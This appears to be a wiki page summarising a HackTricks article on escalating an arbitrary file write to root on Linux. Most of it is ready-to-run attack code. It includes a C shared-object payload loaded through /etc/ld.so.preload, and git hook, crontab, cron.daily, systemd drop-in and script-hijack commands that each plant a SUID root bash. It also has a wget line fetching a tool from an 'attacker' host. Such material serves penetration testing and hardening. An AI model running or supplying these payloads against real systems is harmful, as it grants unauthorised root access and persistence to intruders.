---
title: "HackTricks: Arbitrary File Write to Root"
tags: [linux-hardening, privilege-escalation, file-write, persistence]
sources: [hacktricks-write-to-root.md]
updated: 2026-05-01
---

# HackTricks: Arbitrary File Write to Root

Source: [hacktricks-write-to-root.md](../../raw/hacktricks-write-to-root.md)

## Key Takeaways

A write primitive to a privileged path can escalate to root without any kernel exploit. The technique depends on which specific file or directory is writable. Each vector below converts file write to code execution.

## /etc/ld.so.preload

Like `LD_PRELOAD` but applies to **all** executables including SUID binaries:

```bash
echo "/tmp/pe.so" > /etc/ld.so.preload
```

Payload (`/tmp/pe.so`):

```c
void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0); setuid(0);
    system("/bin/bash");
}
// gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
```

## Git Hooks

If a privileged user commits frequently to a repo you can write to:

```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' \
  > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
```

## Cron / Timer Files

Writable cron targets:

```bash
# Quick checks
ls -la /etc/crontab /etc/cron.d /etc/cron.{hourly,daily,weekly,monthly} 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
```

Append root cron job:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' \
  >> /etc/crontab
```

Drop executable in `run-parts` directory (no dots in filename):

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

## Systemd Unit / Service Files

Writable targets: `/etc/systemd/system/*.service`, drop-ins in `<unit>.d/*.conf`, `ExecStart=` scripts/binaries, `EnvironmentFile=` paths.

```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
grep -R "^ExecStart=\|^EnvironmentFile=" /etc/systemd/system 2>/dev/null
```

Malicious drop-in override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Then: `systemctl daemon-reload && systemctl restart vulnerable.service`

## Root Executing User-Writable Scripts

Detect with **pspy**:

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64 && chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # watch for root invoking paths you own
```

Hijack:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell; chown root:root /tmp/rootshell; chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
# trigger the privileged action, then: ./rootshell -p
```

## Other Vectors

- **PHP sandbox `php.ini`**: If a root-running daemon uses a `php.ini` with `disable_functions` and you can write that file — overwrite to remove restrictions, then execute in second pass
- **MIME / URL scheme handlers** (`~/.config/mimeapps.list`): set `x-scheme-handler/http=evil.desktop` → clicking any http link runs attacker code
- **binfmt_misc** (`/proc/sys/fs/binfmt_misc`): register a custom binary handler for common file types

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Linux Privilege Escalation Checklist](hacktricks-privilege-escalation-checklist.md)
- [HackTricks](../entities/hacktricks.md)
